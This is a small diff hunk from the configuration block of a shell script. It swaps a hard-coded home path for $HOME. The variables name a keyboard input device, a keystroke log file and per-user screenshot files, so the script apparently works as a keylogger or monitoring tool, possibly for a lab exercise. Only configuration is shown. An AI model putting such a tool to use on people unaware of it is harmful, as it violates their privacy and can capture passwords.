@@ -3,7 +3,7 @@
 # --- CONFIGURATION ---
 
 DEVICE="/dev/input/event3"    # keyboard device
-FILEPATH="/home/ashfak-uzzaman/Lab Practice"               
+FILEPATH="$HOME/Lab Practice"               
 LOGFILE="$FILEPATH/key_strokes.txt"               # Log file
 SCREENSHOT_FILE="$FILEPATH/screenshot_${current_user}_$(date +'%Y%m%d_%H%M%S').png"
 
